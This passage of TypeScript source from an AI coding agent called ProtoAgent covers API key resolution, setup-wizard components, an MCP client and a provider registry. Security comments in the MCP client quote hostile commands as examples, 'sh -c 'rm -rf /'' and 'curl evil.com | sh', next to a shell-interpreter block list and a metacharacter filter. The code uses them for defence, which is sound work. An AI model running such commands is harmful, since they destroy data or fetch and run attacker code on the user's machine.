export function resolveApiKey(config: Pick<Config, 'provider' | 'apiKey'>): string | null {
  const provider = getProvider(config.provider);

  // 1. Provider-specific environment variable
  if (provider?.apiKeyEnvVar) {
    const providerEnvOverride = process.env[provider.apiKeyEnvVar]?.trim();
    if (providerEnvOverride) {
      return providerEnvOverride;
    }
  }

  // 2. Generic environment variable
  const envOverride = process.env.PROTOAGENT_API_KEY?.trim();
  if (envOverride) {
    return envOverride;
  }

  // 3. Config file (either from selected provider or direct apiKey)
  const directApiKey = config.apiKey?.trim();
  if (directApiKey) {
    return directApiKey;
  }

  const providerApiKey = provider?.apiKey?.trim();
  if (providerApiKey) {
    return providerApiKey;
  }

  // Fallback for Cloudflare Gateway or other custom header setups
  if (process.env.PROTOAGENT_CUSTOM_HEADERS) {
    return 'none';
  }

  if (!provider?.apiKeyEnvVar) {
    if (provider?.headers && Object.keys(provider.headers).length > 0) {
      return 'none';
    }
    return null;
  }

  if (provider?.headers && Object.keys(provider.headers).length > 0) {
    return 'none';
  }

  return null;
}

export const getConfigDirectory = () => {
  const homeDir = os.homedir();
  if (process.platform === 'win32') {
    return path.join(homeDir, 'AppData', 'Local', 'protoagent');
  }
  return path.join(homeDir, '.local', 'share', 'protoagent');
};

export const getUserRuntimeConfigDirectory = () => {
  const homeDir = os.homedir();
  if (process.platform === 'win32') {
    return path.join(homeDir, 'AppData', 'Local', 'protoagent');
  }
  return path.join(homeDir, '.config', 'protoagent');
};

export const getUserRuntimeConfigPath = () => {
  return path.join(getUserRuntimeConfigDirectory(), 'protoagent.jsonc');
};

export const getProjectRuntimeConfigDirectory = (cwd = process.cwd()) => {
  return path.join(cwd, '.protoagent');
};

export const getProjectRuntimeConfigPath = (cwd = process.cwd()) => {
  return path.join(getProjectRuntimeConfigDirectory(cwd), 'protoagent.jsonc');
};

export const getInitConfigPath = (target: InitConfigTarget, cwd = process.cwd()) => {
  return target === 'project' ? getProjectRuntimeConfigPath(cwd) : getUserRuntimeConfigPath();
};

const RUNTIME_CONFIG_TEMPLATE = \`{
  // Add project or user-wide ProtoAgent runtime config here.
  // Example uses:
  // - choose the active provider/model by making it the first provider
  //   and the first model under that provider
  // - custom providers/models
  // - MCP server definitions
  // - request default parameters
  "providers": {
    // "provider-id": {
    //   "name": "Display Name",
    //   "baseURL": "https://api.example.com/v1",
    //   "apiKey": "your-api-key",
    //   "apiKeyEnvVar": "ENV_VAR_NAME",
    //   "headers": {
    //     "X-Custom-Header": "value"
    //   },
    //   "defaultParams": {},
    //   "models": {
    //     "model-id": {
    //       "name": "Display Name",
    //       "contextWindow": 128000,
    //       "inputPricePerMillion": 2.5,
    //       "outputPricePerMillion": 10.0,
    //       "cachedPricePerMillion": 1.25,
    //       "defaultParams": {}
    //     }
    //   }
    // }
  },
  "mcp": {
    "servers": {
      // "server-name": {
      //   "type": "stdio",
      //   "command": "npx",
      //   "args": ["-y", "@modelcontextprotocol/server-filesystem", "/path/to/dir"],
      //   "env": { "KEY": "value" },
      //   "cwd": "/working/directory",
      //   "enabled": true,
      //   "timeoutMs": 30000
      // },
      // "http-server": {
      //   "type": "http",
      //   "url": "https://mcp-server.example.com",
      //   "headers": { "Authorization": "Bearer token" },
      //   "enabled": true,
      //   "timeoutMs": 30000
      // }
    }
  }
}
\`;

function ensureDirectory(targetDir: string): void {
  if (!existsSync(targetDir)) {
    mkdirSync(targetDir, { recursive: true, mode: CONFIG_DIR_MODE });
  }
  hardenPermissions(targetDir, CONFIG_DIR_MODE);
}

function isPlainObject(value: unknown): value is Record<string, unknown> {
  return Boolean(value) && typeof value === 'object' && !Array.isArray(value);
}

function readRuntimeConfigFileSync(configPath: string): RuntimeConfigFile | null {
  if (!existsSync(configPath)) {
    return null;
  }

  try {
    const content = readFileSync(configPath, 'utf8');
    const errors: Array<{ error: number; offset: number; length: number }> = [];
    const parsed = parse(content, errors, { allowTrailingComma: true, disallowComments: false });
    if (errors.length > 0 || !isPlainObject(parsed)) {
      return null;
    }
    return parsed as RuntimeConfigFile;
  } catch (error) {
    console.error('Error reading runtime config file:', error);
    return null;
  }
}

function getConfiguredProviderAndModel(runtimeConfig: RuntimeConfigFile): Config | null {
  for (const [providerId, providerConfig] of Object.entries(runtimeConfig.providers || {})) {
    const modelId = Object.keys(providerConfig.models || {})[0];
    if (!modelId) continue;
    const apiKey = typeof providerConfig.apiKey === 'string' && providerConfig.apiKey.trim().length > 0
      ? providerConfig.apiKey.trim()
      : undefined;
    return {
      provider: providerId,
      model: modelId,
      ...(apiKey ? { apiKey } : {}),
    };
  }

  return null;
}

function writeRuntimeConfigFile(configPath: string, runtimeConfig: RuntimeConfigFile): void {
  ensureDirectory(path.dirname(configPath));
  writeFileSync(configPath, \`\${JSON.stringify(runtimeConfig, null, 2)}\\n\`, { encoding: 'utf8', mode: CONFIG_FILE_MODE });
  hardenPermissions(configPath, CONFIG_FILE_MODE);
}

function upsertSelectedConfig(runtimeConfig: RuntimeConfigFile, config: Config): RuntimeConfigFile {
  const existingProviders = runtimeConfig.providers || {};
  const currentProvider = existingProviders[config.provider] || {};
  const currentModels = currentProvider.models || {};
  const selectedModelConfig = currentModels[config.model] || {};

  const nextProvider: RuntimeProviderConfig = {
    ...currentProvider,
    ...(config.apiKey?.trim() ? { apiKey: config.apiKey.trim() } : {}),
    models: Object.fromEntries([
      [config.model, selectedModelConfig],
      ...Object.entries(currentModels).filter(([modelId]) => modelId !== config.model),
    ]),
  };

  if (!config.apiKey?.trim()) {
    delete nextProvider.apiKey;
  }

  return {
    ...runtimeConfig,
    providers: Object.fromEntries([
      [config.provider, nextProvider],
      ...Object.entries(existingProviders).filter(([providerId]) => providerId !== config.provider),
    ]),
  };
}

export function writeInitConfig(
  target: InitConfigTarget,
  cwd = process.cwd(),
  options: { overwrite?: boolean } = {}
): { path: string; status: InitConfigWriteStatus } {
  const configPath = getInitConfigPath(target, cwd);
  const alreadyExists = existsSync(configPath);
  if (alreadyExists) {
    if (!options.overwrite) {
      return { path: configPath, status: 'exists' };
    }
  } else {
    ensureDirectory(path.dirname(configPath));
  }

  writeFileSync(configPath, RUNTIME_CONFIG_TEMPLATE, { encoding: 'utf8', mode: CONFIG_FILE_MODE });
  hardenPermissions(configPath, CONFIG_FILE_MODE);
  return { path: configPath, status: alreadyExists ? 'overwritten' : 'created' };
}

export const readConfig = (target: InitConfigTarget | 'active' = 'active', cwd = process.cwd()): Config | null => {
  const configPath = target === 'active' ? getActiveRuntimeConfigPath() : getInitConfigPath(target, cwd);
  if (!configPath) {
    return null;
  }

  const runtimeConfig = readRuntimeConfigFileSync(configPath);
  if (!runtimeConfig) {
    return null;
  }

  return getConfiguredProviderAndModel(runtimeConfig);
};

export function getDefaultConfigTarget(cwd = process.cwd()): InitConfigTarget {
  const activeConfigPath = getActiveRuntimeConfigPath();
  if (activeConfigPath === getProjectRuntimeConfigPath(cwd)) {
    return 'project';
  }
  return 'user';
}

export const writeConfig = (config: Config, target: InitConfigTarget = 'user', cwd = process.cwd()) => {
  const configPath = getInitConfigPath(target, cwd);
  const runtimeConfig = readRuntimeConfigFileSync(configPath) || { providers: {}, mcp: { servers: {} } };
  const nextRuntimeConfig = upsertSelectedConfig(runtimeConfig, config);
  writeRuntimeConfigFile(configPath, nextRuntimeConfig);
  return configPath;
};

// ─── Step Components ───

interface ResetPromptProps {
  existingConfig: Config;
  setStep: (step: number) => void;
  setConfigWritten: (written: boolean) => void;
}
export const ResetPrompt: React.FC<ResetPromptProps> = ({ existingConfig, setStep, setConfigWritten }) => {
  const [resetInput, setResetInput] = useState('');
  const provider = getProvider(existingConfig.provider);

  return (
    <Box flexDirection="column">
      <Text>Existing configuration found:</Text>
      <Text>  Provider: {provider?.name || existingConfig.provider}</Text>
      <Text>  Model: {existingConfig.model}</Text>
      <Text>  API Key: {'*'.repeat(8)}</Text>
      <Text> </Text>
      <Text>Do you want to reset and configure a new one? (y/n)</Text>
      <TextInput
        onSubmit={(answer: string) => {
          if (answer.toLowerCase() === 'y') {
            setStep(2);
          } else {
            setConfigWritten(false);
            setStep(4);
          }
        }}
      />
    </Box>
  );
};

interface TargetSelectionProps {
  title?: string;
  subtitle?: string;
  onSelect: (target: InitConfigTarget) => void;
}
export const TargetSelection: React.FC<TargetSelectionProps> = ({
  title,
  subtitle,
  onSelect,
}) => {
  return (
    <Box flexDirection="column">
      {title && <Text color="green" bold>{title}</Text>}
      {subtitle && <Text>{subtitle}</Text>}
      <Box marginTop={1}>
        <Select
          options={[
            { label: \`Project config — \${getProjectRuntimeConfigPath()}\`, value: 'project' },
            { label: \`Shared user config — \${getUserRuntimeConfigPath()}\`, value: 'user' },
          ]}
          onChange={(value) => onSelect(value as InitConfigTarget)}
        />
      </Box>
    </Box>
  );
};

interface ModelSelectionProps {
  setSelectedProviderId: (id: string) => void;
  setSelectedModelId: (id: string) => void;
  onSelect?: (providerId: string, modelId: string) => void;
  setStep?: (step: number) => void;
  title?: string;
}
export const ModelSelection: React.FC<ModelSelectionProps> = ({
  setSelectedProviderId,
  setSelectedModelId,
  onSelect,
  setStep,
  title,
}) => {
  const items = getAllProviders().flatMap((provider) =>
    provider.models.map((model) => ({
      label: \`\${provider.name} - \${model.name}\`,
      value: \`\${provider.id}:::\${model.id}\`,
    })),
  );

  const handleSelect = (value: string) => {
    const [providerId, modelId] = value.split(':::');
    setSelectedProviderId(providerId);
    setSelectedModelId(modelId);
    if (onSelect) {
      onSelect(providerId, modelId);
    } else {
      setStep?.(3);
    }
  };

  return (
    <Box flexDirection="column">
      {title && <Text color="green" bold>{title}</Text>}
      <Text>Select an AI Model:</Text>
      <Select options={items} onChange={handleSelect} />
    </Box>
  );
};

interface ApiKeyInputProps {
  selectedProviderId: string;
  selectedModelId: string;
  target?: InitConfigTarget;
  title?: string;
  showProviderHeaders?: boolean;
  onComplete?: (config: Config) => void;
  setStep?: (step: number) => void;
  setConfigWritten?: (written: boolean) => void;
}
export const ApiKeyInput: React.FC<ApiKeyInputProps> = ({
  selectedProviderId,
  selectedModelId,
  target = 'user',
  title,
  showProviderHeaders = true,
  onComplete,
  setStep,
  setConfigWritten,
}) => {
  const [errorMessage, setErrorMessage] = useState('');
  const provider = getProvider(selectedProviderId);
  const canUseResolvedAuth = Boolean(resolveApiKey({ provider: selectedProviderId, apiKey: undefined }));

  const handleApiKeySubmit = (value: string) => {
    if (value.trim().length === 0 && !canUseResolvedAuth) {
      setErrorMessage('API key cannot be empty.');
      return;
    }

    const newConfig: Config = {
      provider: selectedProviderId,
      model: selectedModelId,
      ...(value.trim().length > 0 ? { apiKey: value.trim() } : {}),
    };
    writeConfig(newConfig, target);

    if (onComplete) {
      onComplete(newConfig);
    } else {
      setConfigWritten?.(true);
      setStep?.(4);
    }
  };

  return (
    <Box flexDirection="column">
      {title && <Text color="green" bold>{title}</Text>}
      <Text>
        {canUseResolvedAuth ? 'Optional API Key' : 'Enter API Key'} for {provider?.name || selectedProviderId}:
      </Text>
      {showProviderHeaders && provider?.headers && Object.keys(provider.headers).length > 0 && (
        <Text dimColor>
          This provider can authenticate with configured headers or environment variables.
        </Text>
      )}
      {errorMessage && <Text color="red">{errorMessage}</Text>}
      <PasswordInput
        placeholder={canUseResolvedAuth ? 'Press enter to keep resolved auth' : \`Enter your \${provider?.apiKeyEnvVar || 'API'} key\`}
        onSubmit={handleApiKeySubmit}
      />
    </Box>
  );
};

interface ConfigResultProps {
  configWritten: boolean;
}
export const ConfigResult: React.FC<ConfigResultProps> = ({ configWritten }) => {
  return (
    <Box flexDirection="column">
      {configWritten ? (
        <Text color="green">Configuration saved successfully!</Text>
      ) : (
        <Text color="yellow">Configuration not changed.</Text>
      )}
      <Text>You can now run ProtoAgent.</Text>
    </Box>
  );
};

export const ConfigureComponent = () => {
  const [step, setStep] = useState(0);
  const [target, setTarget] = useState<InitConfigTarget>(getDefaultConfigTarget());
  const [existingConfig, setExistingConfig] = useState<Config | null>(null);
  const [selectedProviderId, setSelectedProviderId] = useState('');
  const [selectedModelId, setSelectedModelId] = useState('');
  const [configWritten, setConfigWritten] = useState(false);

  if (step === 0) {
    return (
      <TargetSelection
        subtitle="Choose where to configure ProtoAgent:"
        onSelect={(value) => {
          setTarget(value);
          const existing = readConfig(value);
          setExistingConfig(existing);
          setStep(existing ? 1 : 2);
        }}
      />
    );
  }

  switch (step) {
    case 1:
      return <ResetPrompt existingConfig={existingConfig!} setStep={setStep} setConfigWritten={setConfigWritten} />;
    case 2:
      return (
        <ModelSelection
          setSelectedProviderId={setSelectedProviderId}
          setSelectedModelId={setSelectedModelId}
          setStep={setStep}
        />
      );
    case 3:
      return (
        <ApiKeyInput
          selectedProviderId={selectedProviderId}
          selectedModelId={selectedModelId}
          target={target}
          setStep={setStep}
          setConfigWritten={setConfigWritten}
        />
      );
    case 4:
      return <ConfigResult configWritten={configWritten} />;
    default:
      return <Text>Unknown step.</Text>;
  }
};

export const InitComponent = () => {
  const [selectedTarget, setSelectedTarget] = useState<InitConfigTarget | null>(null);
  const [result, setResult] = useState<{ path: string; status: InitConfigWriteStatus } | null>(null);
  const options: Array<{ label: string; value: InitConfigTarget; description: string }> = [
    {
      label: 'Project config',
      value: 'project',
      description: getProjectRuntimeConfigPath(),
    },
    {
      label: 'Shared user config',
      value: 'user',
      description: getUserRuntimeConfigPath(),
    },
  ];
  const activeTarget = selectedTarget ?? 'project';
  const activeOption = options.find((option) => option.value === activeTarget) ?? options[0];

  if (selectedTarget && !result) {
    const selectedPath = getInitConfigPath(selectedTarget);
    return (
      <Box flexDirection="column">
        <Text>Config already exists:</Text>
        <Text>{selectedPath}</Text>
        <Text>Overwrite it? (y/n)</Text>
        <TextInput
          onSubmit={(answer: string) => {
            if (answer.trim().toLowerCase() === 'y') {
              setResult(writeInitConfig(selectedTarget, process.cwd(), { overwrite: true }));
            } else {
              setResult({ path: selectedPath, status: 'exists' });
            }
          }}
        />
      </Box>
    );
  }

  if (result) {
    const color = result.status === 'exists' ? 'yellow' : 'green';
    const message = result.status === 'created'
      ? 'Created ProtoAgent config:'
      : result.status === 'overwritten'
        ? 'Overwrote ProtoAgent config:'
        : 'ProtoAgent config already exists:';
    return (
      <Box flexDirection="column">
        <Text color={color}>{message}</Text>
        <Text>{result.path}</Text>
      </Box>
    );
  }

  return (
    <Box flexDirection="column">
      <Text>Create a ProtoAgent runtime config:</Text>
      <Text dimColor>Select where to write \`protoagent.jsonc\`.</Text>
      <Text dimColor>{activeOption.description}</Text>
      <Box marginTop={1}>
        <Select
          options={options.map((option) => ({ label: option.label, value: option.value }))}
          onChange={(value) => {
            const target = value as InitConfigTarget;
            const configPath = getInitConfigPath(target);
            if (existsSync(configPath)) {
              setSelectedTarget(target);
              return;
            }
            setResult(writeInitConfig(target));
          }}
        />
      </Box>
    </Box>
  );
};
`,
  },
  {
    path: "src/mcp.ts",
    content: `/**
 * MCP (Model Context Protocol) client.
 *
 * Uses the official @modelcontextprotocol/sdk to connect to MCP servers
 * over both stdio (spawned processes) and HTTP transports.
 *
 * Configuration in \`protoagent.jsonc\` under \`mcp.servers\`:
 * {
 *   "servers": {
 *     "my-stdio-server": {
 *       "type": "stdio",
 *       "command": "npx",
 *       "args": ["-y", "@my/mcp-server"],
 *       "env": { "API_KEY": "..." }
 *     },
 *     "my-http-server": {
 *       "type": "http",
 *       "url": "http://localhost:3000/mcp"
 *     }
 *   }
 * }
 *
 * Stdio servers are spawned as child processes communicating over stdin/stdout.
 * HTTP servers connect to a running server via HTTP POST/GET with SSE streaming.
 *
 * SECURITY NOTES:
 * - MCP servers receive LIMITED environment variables (not full process.env)
 * - Commands are validated against shell interpreters and dangerous patterns
 * - All MCP servers require explicit user approval on first connection
 */

import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { loadRuntimeConfig, getRuntimeConfig, type RuntimeMcpServerConfig } from './runtime-config.js';
import { logger } from './utils/logger.js';
import { registerDynamicTool, registerDynamicHandler } from './tools/index.js';
import { requestApproval } from './utils/approval.js';

// Security: Allowlist of safe environment variables for MCP servers
// Naive approach: Pass full process.env to MCP servers
// Risk: MCP server can steal API keys, tokens, credentials from environment
// Attack: Malicious MCP server reads OPENAI_API_KEY, ANTHROPIC_API_KEY, etc.
const ALLOWED_MCP_ENV_VARS = [
  'PATH',
  'HOME',
  'USER',
  'LOGNAME',
  'LANG',
  'LC_ALL',
  'LC_CTYPE',
  'LC_MESSAGES',
  'TZ',
  'SHELL',
  'TERM',
  'TMPDIR',
  'NODE_OPTIONS',  // Required for some Node.js MCP servers
];

// Security: Blocked shell interpreters and dangerous commands
// Naive approach: Accept any command
// Risk: Command injection via shell metacharacters
// Attack: "command": "sh -c 'rm -rf /'" or "command": "bash" with malicious args
const BLOCKED_SHELLS = new Set([
  'sh', 'bash', 'zsh', 'fish', 'csh', 'tcsh', 'ksh', 'dash',
  'cmd.exe', 'cmd', 'powershell.exe', 'powershell', 'pwsh', 'pwsh.exe',
]);

// Security: Dangerous patterns in command arguments
const DANGEROUS_ARG_PATTERNS = /[;|&\$()\`<>]/;

// ─── MCP Server Configuration ───

type StdioServerConfig = Extract<RuntimeMcpServerConfig, { type: 'stdio' }>;
type HttpServerConfig = Extract<RuntimeMcpServerConfig, { type: 'http' }>;

// ─── MCP Server Connection Manager ───

interface McpConnection {
  client: Client;
  serverName: string;
  transport: StdioClientTransport | StreamableHTTPClientTransport;
}

const connections = new Map<string, McpConnection>();

// Track approved MCP servers to prevent re-prompting
const approvedServers = new Set<string>();

/**
 * Security: Validate MCP server command
 * Naive approach: Accept any command string
 * Risk: Command injection, shell escape, arbitrary code execution
 * Attack: "command": "sh", "args": ["-c", "curl evil.com | sh"]
 */
function validateMcpCommand(command: string, args: string[]): { valid: boolean; error?: string } {
  // Check for shell interpreters
  const baseCommand = command.split('/').pop() || command;
  if (BLOCKED_SHELLS.has(baseCommand.toLowerCase())) {
    return {
      valid: false,
      error: \`MCP server command "\${command}" is a shell interpreter. Shell interpreters are blocked for security.\`,
    };
  }

  // Check for absolute path traversal
  if (command.includes('..')) {
    return {
      valid: false,
      error: \`MCP server command "\${command}" contains path traversal (..).\`,
    };
  }

  // Validate arguments don't contain shell metacharacters
  for (const arg of args) {
    if (DANGEROUS_ARG_PATTERNS.test(arg)) {
      return {
        valid: false,
        error: \`MCP server argument contains dangerous characters: "\${arg.slice(0, 50)}". Shell metacharacters are not allowed.\`,
      };
    }
  }

  return { valid: true };
}

/**
 * Security: Filter environment variables for MCP servers
 * Naive approach: Pass all process.env
 * Risk: Credential theft via environment exfiltration
 * Attack: Malicious MCP reads OPENAI_API_KEY, AWS credentials, etc.
 */
function filterMcpEnvironment(
  customEnv?: Record<string, string>
): Record<string, string> {
  const filtered: Record<string, string> = {};

  // Only copy allowed environment variables
  for (const key of ALLOWED_MCP_ENV_VARS) {
    const value = process.env[key];
    if (value !== undefined) {
      filtered[key] = value;
    }
  }

  // Merge in custom env from config (user explicitly set these)
  // These should be reviewed by user during approval
  if (customEnv) {
    for (const [key, value] of Object.entries(customEnv)) {
      filtered[key] = value;
    }
  }

  return filtered;
}

/**
 * Create an MCP client connection for a stdio server.
 */
async function connectStdioServer(
  serverName: string,
  config: StdioServerConfig
): Promise<McpConnection> {
  // Security: Validate command before spawning
  const validation = validateMcpCommand(config.command, config.args || []);
  if (!validation.valid) {
    throw new Error(validation.error);
  }

  // Security: Filter environment variables
  const filteredEnv = filterMcpEnvironment(config.env);

  const transport = new StdioClientTransport({
    command: config.command,
    args: config.args || [],
    env: filteredEnv,
    cwd: config.cwd,
    stderr: 'pipe',
  });

  const client = new Client(
    {
      name: 'protoagent',
      version: '0.0.1',
    },
    {
      capabilities: {},
    }
  );

  await client.connect(transport);

  // Pipe stderr from the spawned process to the logger instead of letting it
  // bleed through to the terminal and corrupt the Ink UI.
  (transport as any).stderr?.on('data', (data: Buffer) => {
    for (const line of data.toString('utf-8').split('\\n')) {
      if (line.trim()) logger.debug(\`MCP [\${serverName}] \${line}\`);
    }
  });

  return {
    client,
    serverName,
    transport,
  };
}

/**
 * Create an MCP client connection for an HTTP server.
 */
async function connectHttpServer(
  serverName: string,
  config: HttpServerConfig
): Promise<McpConnection> {
  const transport = new StreamableHTTPClientTransport(new URL(config.url), {
    requestInit: config.headers ? { headers: config.headers } : undefined,
  });

  const client = new Client(
    {
      name: 'protoagent',
      version: '0.0.1',
    },
    {
      capabilities: {},
    }
  );

  await client.connect(transport);

  return {
    client,
    serverName,
    transport,
  };
}

/**
 * Register all tools from an MCP server into the dynamic tool registry.
 */
async function registerMcpTools(conn: McpConnection): Promise<void> {
  try {
    const response = await conn.client.listTools();
    const tools = response.tools || [];

    logger.info(\`MCP [\${conn.serverName}] discovered \${tools.length} tools\`);

    for (const tool of tools) {
      const toolName = \`mcp_\${conn.serverName}_\${tool.name}\`;

      registerDynamicTool({
        type: 'function' as const,
        function: {
          name: toolName,
          description: \`[MCP: \${conn.serverName}] \${tool.description || tool.name}\`,
          parameters: tool.inputSchema as any,
        },
      });

      registerDynamicHandler(toolName, async (args: unknown) => {
        const result = await conn.client.callTool({
          name: tool.name,
          arguments: (args && typeof args === 'object' ? args : {}) as Record<string, unknown>,
        });

        // MCP tool results are arrays of content blocks
        if (Array.isArray(result.content)) {
          return result.content
            .map((c: any) => {
              if (c.type === 'text') return c.text;
              return JSON.stringify(c);
            })
            .join('\\n');
        }

        return JSON.stringify(result);
      });
    }
  } catch (err) {
    logger.error(\`Failed to register tools for MCP [\${conn.serverName}]: \${err}\`);
  }
}

/**
 * Load MCP configuration and connect to all configured servers.
 * Registers their tools in the dynamic tool registry.
 */
export async function initializeMcp(): Promise<void> {
  await loadRuntimeConfig();
  const servers = getRuntimeConfig().mcp?.servers || {};

  if (Object.keys(servers).length === 0) return;

  logger.info('Loading MCP servers from merged runtime config');

  for (const [name, serverConfig] of Object.entries(servers)) {
    if (serverConfig.enabled === false) {
      logger.debug(\`Skipping disabled MCP server: \${name}\`);
      continue;
    }

    // Security: Require user approval for MCP servers
    // Naive approach: Auto-connect to all configured servers
    // Risk: Malicious MCP server in config exfiltrates data or executes code
    // Attack: Attacker modifies protoagent.jsonc to add malicious MCP server
    if (!approvedServers.has(name)) {
      const description = serverConfig.type === 'stdio'
        ? \`MCP server "\${name}" will execute: \${serverConfig.command} \${(serverConfig.args || []).join(' ')}\`
        : \`MCP server "\${name}" will connect to: \${serverConfig.url}\`;

      const approved = await requestApproval({
        id: \`mcp-\${name}-\${Date.now()}\`,
        type: 'shell_command',
        description: \`Connect to MCP server: \${name}\`,
        detail: \`\${description}\\n\\nMCP servers can execute arbitrary code and access files. Only connect to servers you trust.\`,
        sessionId: undefined,
        sessionScopeKey: \`mcp:\${name}\`,
      });

      if (!approved) {
        logger.warn(\`User rejected MCP server: \${name}\`);
        continue;
      }

      approvedServers.add(name);
    }

    try {
      let conn: McpConnection;

      if (serverConfig.type === 'stdio') {
        logger.debug(\`Connecting to stdio MCP server: \${name}\`);
        conn = await connectStdioServer(name, serverConfig);
      } else if (serverConfig.type === 'http') {
        logger.debug(\`Connecting to HTTP MCP server: \${name} (\${serverConfig.url})\`);
        conn = await connectHttpServer(name, serverConfig);
      } else {
        logger.error(\`Unknown MCP server type for "\${name}": \${(serverConfig as any).type}\`);
        continue;
      }

      connections.set(name, conn);
      await registerMcpTools(conn);
    } catch (err) {
      logger.error(\`Failed to connect to MCP server "\${name}": \${err}\`);
    }
  }
}

/**
 * Close all MCP connections.
 */
export async function closeMcp(): Promise<void> {
  for (const [name, conn] of connections) {
    try {
      logger.debug(\`Closing MCP connection: \${name}\`);
      await conn.client.close();
    } catch (err) {
      logger.error(\`Error closing MCP connection [\${name}]: \${err}\`);
    }
  }
  connections.clear();
}

/**
 * Get the names of all connected MCP servers.
 */
export function getConnectedMcpServers(): string[] {
  return Array.from(connections.keys());
}
`,
  },
  {
    path: "src/providers.ts",
    content: `/**
 * Provider and model registry.
 *
 * Built-in providers are declared in source and merged with runtime overrides
 * from \`protoagent.jsonc\`.
 */

import { getRuntimeConfig } from './runtime-config.js';

export interface ModelDetails {
  id: string;
  name: string;
  contextWindow: number;
  pricingPerMillionInput: number;
  pricingPerMillionOutput: number;
  pricingPerMillionCached?: number;
  defaultParams?: Record<string, unknown>;
}

export interface ModelProvider {
  id: string;
  name: string;
  baseURL?: string;
  apiKey?: string;
  apiKeyEnvVar?: string;
  headers?: Record<string, string>;
  defaultParams?: Record<string, unknown>;
  models: ModelDetails[];
}

export const BUILTIN_PROVIDERS: ModelProvider[] = [
  {
    id: 'openai',
    name: 'OpenAI',
    apiKeyEnvVar: 'OPENAI_API_KEY',
    models: [
      { id: 'gpt-5.4', name: 'GPT-5.4', contextWindow: 1_048_576, pricingPerMillionInput: 2.50, pricingPerMillionOutput: 15.00 },
      { id: 'gpt-5-mini', name: 'GPT-5 Mini', contextWindow: 1_000_000, pricingPerMillionInput: 0.25, pricingPerMillionOutput: 2.00 },
      { id: 'gpt-4.1', name: 'GPT-4.1', contextWindow: 1_048_576, pricingPerMillionInput: 2.0, pricingPerMillionOutput: 8.00 },
    ],
  },
  {
    id: 'anthropic',
    name: 'Anthropic Claude',
    baseURL: 'https://api.anthropic.com/v1/',
    apiKeyEnvVar: 'ANTHROPIC_API_KEY',
    models: [
      { id: 'claude-opus-4-6', name: 'Claude Opus 4.6', contextWindow: 200_000, pricingPerMillionInput: 5.0, pricingPerMillionOutput: 25.0 },
      { id: 'claude-sonnet-4-6', name: 'Claude Sonnet 4.6', contextWindow: 200_000, pricingPerMillionInput: 3.0, pricingPerMillionOutput: 15.0 },
      { id: 'claude-haiku-4-5', name: 'Claude Haiku 4.5', contextWindow: 200_000, pricingPerMillionInput: 1.0, pricingPerMillionOutput: 5.0 },
    ],
  },
  {
    id: 'google',
    name: 'Google Gemini',
    baseURL: 'https://generativelanguage.googleapis.com/v1beta/openai/',
    apiKeyEnvVar: 'GEMINI_API_KEY',
    models: [
      { id: 'gemini-3-flash-preview', name: 'Gemini 3 Flash (Preview)', contextWindow: 1_000_000, pricingPerMillionInput: 0.50, pricingPerMillionOutput: 3.0 },
      { id: 'gemini-3.1-pro-preview', name: 'Gemini 3.1 Pro (Preview)', contextWindow: 1_000_000, pricingPerMillionInput: 2.0, pricingPerMillionOutput: 12.0 },
      { id: 'gemini-2.5-flash', name: 'Gemini 2.5 Flash', contextWindow: 1_000_000, pricingPerMillionInput: 0.30, pricingPerMillionOutput: 2.5 },
      { id: 'gemini-2.5-pro', name: 'Gemini 2.5 Pro', contextWindow: 1_000_000, pricingPerMillionInput: 1.25, pricingPerMillionOutput: 10.0 },
    ],
  },
];

function sanitizeDefaultParams(defaultParams?: Record<string, unknown>): Record<string, unknown> | undefined {
  if (!defaultParams || Object.keys(defaultParams).length === 0) return undefined;
  return defaultParams;
}

function toProviderMap(providers: ModelProvider[]): Map<string, ModelProvider> {
  return new Map(providers.map((provider) => [provider.id, provider]));
}

function mergeModelLists(baseModels: ModelDetails[], overrideModels?: Record<string, any>): ModelDetails[] {
  const merged = new Map(baseModels.map((model) => [model.id, model]));
  for (const [modelId, override] of Object.entries(overrideModels || {})) {
    const current = merged.get(modelId);
    merged.set(modelId, {
      id: modelId,
      name: override.name ?? current?.name ?? modelId,
      contextWindow: override.contextWindow ?? current?.contextWindow ?? 0,
      pricingPerMillionInput: override.inputPricePerMillion ?? current?.pricingPerMillionInput ?? 0,
      pricingPerMillionOutput: override.outputPricePerMillion ?? current?.pricingPerMillionOutput ?? 0,
      pricingPerMillionCached: override.cachedPricePerMillion ?? current?.pricingPerMillionCached,
      defaultParams: sanitizeDefaultParams({
        ...(current?.defaultParams || {}),
        ...(override.defaultParams || {}),
      }),
    });
  }
  return Array.from(merged.values());
}

export function getAllProviders(): ModelProvider[] {
  const runtimeProviders = getRuntimeConfig().providers || {};
  const mergedProviders = toProviderMap(BUILTIN_PROVIDERS);

  for (const [providerId, providerConfig] of Object.entries(runtimeProviders)) {
    const current = mergedProviders.get(providerId);
    mergedProviders.set(providerId, {
      id: providerId,
      name: providerConfig.name ?? current?.name ?? providerId,
      baseURL: providerConfig.baseURL ?? current?.baseURL,
      apiKey: providerConfig.apiKey ?? current?.apiKey,
      apiKeyEnvVar: providerConfig.apiKeyEnvVar ?? current?.apiKeyEnvVar,
      headers: providerConfig.headers ?? current?.headers,
      defaultParams: sanitizeDefaultParams({
        ...(current?.defaultParams || {}),
        ...(providerConfig.defaultParams || {}),
      }),
      models: mergeModelLists(current?.models || [], providerConfig.models),
    });
  }

  return Array.from(mergedProviders.values());
}

export function getProvider(providerId: string): ModelProvider | undefined {
  return getAllProviders().find((provider) => provider.id === providerId);
}

export function getModelDetails(providerId: string, modelId: string): ModelDetails | undefined {
  return getProvider(providerId)?.models.find((model) => model.id === modelId);
}

export function getModelPricing(providerId: string, modelId: string) {
  const details = getModelDetails(providerId, modelId);
  if (!details) return undefined;
  return {
    inputPerToken: details.pricingPerMillionInput / 1_000_000,
    outputPerToken: details.pricingPerMillionOutput / 1_000_000,
    cachedPerToken: details.pricingPerMillionCached != null ? details.pricingPerMillionCached / 1_000_000 : undefined,
    contextWindow: details.contextWindow,
  };
}

export function getRequestDefaultParams(providerId: string, modelId: string): Record<string, unknown> {
  const provider = getProvider(providerId);
  const model = getModelDetails(providerId, modelId);
  return {
    ...(provider?.defaultParams || {}),
    ...(model?.defaultParams || {}),
  };
}
`,
  },
  {
    path: "src/runtime-config.ts",
    content: `import fs from 'node:fs/promises';
import { existsSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { parse, printParseErrorCode } from 'jsonc-parser';
